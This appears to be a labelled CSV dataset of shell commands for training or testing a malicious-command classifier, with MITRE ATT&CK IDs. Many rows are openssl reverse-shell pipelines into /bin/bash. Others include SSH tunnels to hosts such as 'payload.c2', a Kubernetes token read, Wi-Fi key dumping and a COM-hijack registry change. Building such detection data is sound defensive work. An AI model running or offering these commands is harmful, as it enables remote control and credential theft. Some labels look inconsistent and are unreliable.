command,label,original_label,mitre_id
openssl s_client -quiet -connect 10.10.10.25:995 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
go mod verify,Benign,Benign,Benign
ssh -R 8080:localhost:8443 operator@10.10.10.50,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.10:993 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
"if ($app -eq $null) { Write-Warning ""Application not found""; exit }",Malicious,Malicious,T1098
pw-config [-n|--name] pipewire-pulse.conf list,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:53 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.5.20:9090 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
fisher plugin1 plugin2,Benign,Benign,Benign
"find / -user vivek -name ""*.sh""",Context_Dependent,Benign,Benign
"ln -sf ""$(readlink -f ""$1"")"" ""$*""",Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:143,Malicious,Synthetic,Synthetic
pidstat -e /bin/sh,Malicious,Malicious,T1059
openssl s_client -quiet -connect 172.16.0.10:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:3306,Malicious,Synthetic,Synthetic
mpirun -n n path/to/executable,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8443,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.25:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:53,Malicious,Synthetic,Synthetic
sdcv search_term,Benign,Benign,Benign
sudo tlp-stat [-t|--temp],Benign,Benign,Benign
query session,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:8443 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
meshnamed,Benign,Benign,Benign
aws acm-pca describe-certificate-authority --certificate-authority-arn ca_arn,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:3306,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.5.20:8443 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
ssh -L 8080:localhost:8443 operator@internal.corp,Context_Dependent,Synthetic,Synthetic
abspath=$(readlink -e $path),Benign,Benign,Benign
MOUNT A A:\ -t floppy,Context_Dependent,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:22,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.20.30.40:3306 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.10:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.0.5:4444,Malicious,Synthetic,Synthetic
miniserve path/to/file,Benign,Benign,Benign
shar [-V|--vanilla-operation] path/to/file1 path/to/file2 ... > path/to/archive.sh,Benign,Benign,Benign
cmake path/to/project_directory -D CMAKE_BUILD_TYPE=Release,Benign,Benign,Benign
truncate [-s|--size] -2G path/to/file,Benign,Benign,Benign
ludusavi backups --path path/to/backup,Benign,Benign,Benign
jj [desc|describe] [-m|--message] message,Benign,Benign,Benign
sudo mount -t vboxsf D:\share_folder_vm \share_folder,Benign,Benign,Benign
xdg-mime query default image/png,Benign,Benign,Benign
svn status | grep '\!' | cut -d\ -f2-,Benign,Benign,Benign
cadaver http://dav.example.com/,Benign,Benign,Benign
soffice --view path/to/file1 path/to/file2 ...,Benign,Benign,Benign
scp -3 host1:path/to/remote_file host2:path/to/remote_directory,Benign,Benign,Benign
openssl s_client -quiet -connect 10.20.30.40:445 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
"rundll32 SHELL32.DLL,ShellExec_RunDLL {PATH:.exe} {CMD:args}",Malicious,Malicious,T1218
openssl s_client -quiet -connect 172.16.0.10:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:6379,Malicious,Synthetic,Synthetic
ssh -L 8080:localhost:5432 user@10.0.0.8,Context_Dependent,Synthetic,Synthetic
cat file.json | jello _[0],Benign,Benign,Benign
"eva ""(1 + 2) * 2 ^ 2""",Benign,Benign,Benign
ssh -R 8080:localhost:1433 jenkins@192.168.1.1,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.5:445 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:10.0.0.100:143 audit@192.168.1.25,Context_Dependent,Synthetic,Synthetic
read -rep $'Please Enter a Message:\n' message,Benign,Benign,Benign
ssh -R 4444:localhost:3306 support@192.168.0.50,Context_Dependent,Synthetic,Synthetic
asciinema [r|record] [-i|--idle-time-limit] 2.5,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.10:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:993,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:6379,Malicious,Synthetic,Synthetic
ssh -R 8080:localhost:8443 root@10.0.0.5,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:22 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.5:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:110,Malicious,Synthetic,Synthetic
"reg add ""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ProgID"" /ve /T REG_SZ /d ""AtomicTest"" /f",Malicious,Malicious,T1546
newsboat [-r|--refresh-on-start],Benign,Benign,Benign
ssh -L 8080:localhost:993 jenkins@assets-dropper.net,Context_Dependent,Synthetic,Synthetic
mesg [-v|--verbose],Benign,Benign,Benign
rdpsign path\to\file.rdp /v,Benign,Benign,Benign
QOwnNotes --dump-settings,Benign,Benign,Benign
cluster input.gv,Benign,Benign,Benign
"echo ""error"" 1>&2 | tee -a log",Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:5432,Malicious,Synthetic,Synthetic
ssh -R 4444:localhost:22 svcuser@ops-audit.internal,Context_Dependent,Synthetic,Synthetic
"tgpt [-c|--code] ""prompt""",Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:445,Malicious,Synthetic,Synthetic
stress-ng [-m|--vm] 2 --vm-bytes 512M [-t|--timeout] 30s,Benign,Benign,Benign
qtcreator -noload plugin,Benign,Benign,Benign
steamos-chroot [-h|--help],Benign,Benign,Benign
urlget - /path/to/input-file,Context_Dependent,Malicious,T1005
"""PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe"" --pipe 5",Malicious,Malicious,T1559
git bundle create path/to/file.bundle branch_name,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:6379 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.50:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:1433,Malicious,Synthetic,Synthetic
find /home -atime +7,Context_Dependent,Benign,Benign
sed -r 's/((:[^: \t]*){3}):[^ \t]*/\1/g' file | column -t,Benign,Benign,Benign
logsave logfile -,Benign,Benign,Benign
ssh -R 8080:localhost:80 root@10.20.30.40,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.10:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:22,Malicious,Synthetic,Synthetic
composer require user/package,Benign,Benign,Benign
<Ctrl a><d>,Benign,Benign,Benign
runcon [-t|--type] domain_t command,Benign,Benign,Benign
addcomputer.py -computer-name COMPUTER_NAME$ -computer-pass computer_password domain/username:password,Benign,Benign,Benign
"qm set 100 --hostpci0 0000:00:02,x-vga=1 --bios ovmf",Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:445 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
zeroclaw migrate [-h|--help],Benign,Benign,Benign
cleanmgr /d C /lowdisk,Benign,Benign,Benign
dunstctl close-all,Benign,Benign,Benign
foot [-C|--check-config],Benign,Benign,Benign
"setfattr [-n|--name] user.attribute_name [-v|--value] ""value"" path/to/file",Benign,Benign,Benign
gawk '//' /path/to/input-file,Context_Dependent,Malicious,T1005
openssl s_client -quiet -connect 172.20.10.8:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:80,Malicious,Synthetic,Synthetic
gst-device-monitor-1.0 [-f|--follow],Benign,Benign,Benign
gpg-zip --list-archive path/to/archive.gpg,Benign,Benign,Benign
cargo clean [-r|--release],Benign,Benign,Benign
ssh -R 8080:localhost:80 jenkins@example.com,Context_Dependent,Synthetic,Synthetic
ssh -R 4444:localhost:3306 user@10.0.0.25,Context_Dependent,Synthetic,Synthetic
chgrp -R apache_user files,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:53 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
devfsadm -C -v -n,Benign,Benign,Benign
ssh -L 8080:localhost:5432 user@192.168.1.10,Context_Dependent,Synthetic,Synthetic
netsh wlan show profile * key=clear,Context_Dependent,Malicious,T1016
openssl s_client -quiet -connect 172.16.0.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
find . -iname '.note' | sort -r,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.10:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.1:445,Malicious,Synthetic,Synthetic
uv python uninstall version,Benign,Benign,Benign
jupytext --to py path/to/notebook.ipynb,Benign,Benign,Benign
ip [st|stats] show group link,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:80,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.25:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:6379,Malicious,Synthetic,Synthetic
ssh -R 4444:localhost:9001 root@10.0.0.8,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 10.20.30.40:80 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
sudo [-i|--login] [-u|--user] user,Benign,Benign,Benign
systeminfo /s remote_name /u username /p password,Benign,Benign,Benign
"find . -name ""*.andnav"" | rename ""s/\.andnav$/.tile/""",Benign,Benign,Benign
tv,Benign,Benign,Benign
zip -r,Malicious,Malicious,T1560
tldr expand,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:445 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
hg serve [-p|--port] port,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4444,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.5.20:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:5432,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.50:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
ls /srv/www/,Benign,Synthetic,Synthetic
calligrasheets --help|version,Benign,Benign,Benign
hyprpicker [-h|--help],Benign,Benign,Benign
ssh -R 4444:localhost:9090 user@192.168.1.100,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.50:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4444,Malicious,Synthetic,Synthetic
pwn shellcraft amd64.linux.sh,Benign,Benign,Benign
ssh -R 8080:localhost:443 user@172.20.10.8,Context_Dependent,Synthetic,Synthetic
funzip path/to/archive.zip,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:1433 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
newrole [-r|--role] role_name [-t|--type] type_name,Benign,Benign,Benign
ssh -R 8080:localhost:22 operator@10.20.30.40,Context_Dependent,Synthetic,Synthetic
john --restore=path/to/mycrack.rec,Benign,Benign,Benign
ssh -L 8080:localhost:8888 user@172.16.0.10,Context_Dependent,Synthetic,Synthetic
spi search_terms,Benign,Benign,Benign
acyclic path/to/input.gv > path/to/output.gv,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:1433,Malicious,Synthetic,Synthetic
sudo pacman -U --overwrite path/to/file path/to/package.pkg.tar.zst,Benign,Benign,Benign
chown -R deploy:deploy /home/user/projects,Benign,Synthetic,Synthetic
aspell --lang cs,Benign,Benign,Benign
sudo euse [-E|--enable] use_flag,Benign,Benign,Benign
msserver.exe,Malicious,Malicious,T1570
"alias psgrep=""ps -ef | grep""",Benign,Benign,Benign
tldr basename,Benign,Benign,Benign
ssh -L 8080:localhost:5432 postgres@example.com,Context_Dependent,Synthetic,Synthetic
"sysctl -n ""/../../path/to/input-file""",Context_Dependent,Malicious,T1005
topgrade [-c|--cleanup],Benign,Benign,Benign
"find / -type d -name ""project.images"" -ls",Context_Dependent,Benign,Benign
chcon [-r|--role] role filename,Benign,Benign,Benign
gpg-card passwd,Benign,Benign,Benign
latexmk -f path/to/source.tex,Benign,Benign,Benign
cloudflared tunnel route dns name|uuid hostname,Benign,Benign,Benign
"zcat file.gz | awk -v RS=""-----------\n"" '/A=2[ ,\n]/ && /dummy=2[ ,\n]/{count++} !/dummy=2[ ,\n]/{other++} END{print ""Final counter value="",count, ""; other="", other}'",Benign,Benign,Benign
func start,Benign,Benign,Benign
ls /home/deploy/,Benign,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.10:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.1:3389,Malicious,Synthetic,Synthetic
"echo ""deb-src http://ppa.launchpad.net/webupd8team/java/ubuntu precise main"" | tee -a /etc/apt/sources.list",Benign,Benign,Benign
ssh -f user@gateway -p 24222 -L 3307:1.2.3.4:3306 -N,Context_Dependent,Benign,Benign
hledger-web,Benign,Benign,Benign
pinky,Benign,Synthetic,Synthetic
gh pr checks pr_number --watch,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9090,Malicious,Synthetic,Synthetic
while command; do :; done,Benign,Benign,Benign
svccfg export servicename > path/to/smf_file.xml,Benign,Benign,Benign
"notify-send [-t|--expire-time] 5000 ""Test"" ""This is a test""",Benign,Benign,Benign
ssh -R 8080:localhost:80 support@payload.c2,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:22,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.25:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:5432,Malicious,Synthetic,Synthetic
sudo make /tmp/hello,Malicious,Malicious,T1548
openssl s_client -quiet -connect 192.168.0.5:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:993,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9090,Malicious,Synthetic,Synthetic
calibredb search search_term,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9001,Malicious,Synthetic,Synthetic
berks install,Benign,Benign,Benign
ssh -R 8080:localhost:80 support@10.0.0.10,Context_Dependent,Synthetic,Synthetic
ssh -R 8080:localhost:8888 user@10.0.0.10,Context_Dependent,Synthetic,Synthetic
pest --parallel,Benign,Benign,Benign
openstack subnet list,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:110,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.25:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
ssh -R 4444:localhost:5432 user@10.0.0.8,Context_Dependent,Synthetic,Synthetic
kubectl --context kind-atomic-cluster exec atomic-pod -- cat /run/secrets/kubernetes.io/serviceaccount/token,Malicious,Malicious,T1552
"sprio [-j|--jobs] job_id_1,job_id_2,...",Benign,Benign,Benign
wami [-a|--show-all] [-S|--sort] desc --github search_string,Benign,Benign,Benign
find . -type d -ctime $FTIME,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:8443 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
ssh -L 8080:localhost:80 postgres@update.bad,Context_Dependent,Synthetic,Synthetic
sudo arptables [-D|--delete] INPUT rule_number,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:3306 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
npm audit fix [-f|--force],Benign,Benign,Benign
fakeroot [-u|--unknown-is-real] -- command command_arguments,Benign,Benign,Benign
x11docker [-d|--desktop] x11docker/xfce,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:1433 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
script -q -c '# DATA' /path/to/output-file,Malicious,Malicious,T1222
/Library/LaunchAgents,Malicious,Malicious,T1543
top -bn1 -o %MEM | head -15,Benign,Synthetic,Synthetic
unsetopt,Benign,Benign,Benign
"nl -b a file | sort -k1,1nr | sed '1, 4 d' | sort -k1,1n | sed 's/^ *[0-9]*\t//'",Benign,Benign,Benign
cmp /path/to/input-file /dev/zero -b -l,Context_Dependent,Malicious,T1005
"kubectl run $pod_name --image=$image_name --restart=Never --attach --rm -i -- bash -lc ""apt-get update -y >/dev/null 2>&1 && apt-get install -y at >/dev/null 2>&1 && (atd || /usr/sbin/atd) && echo '$at_command' | at $time_spec && at -l""",Malicious,Malicious,T1053
df -h path-to-file,Benign,Benign,Benign
isisdl --sync,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:5432 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:995 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
"[DllImport(""user32.dll"", CharSet=CharSet.Auto)]",Malicious,Malicious,T1491
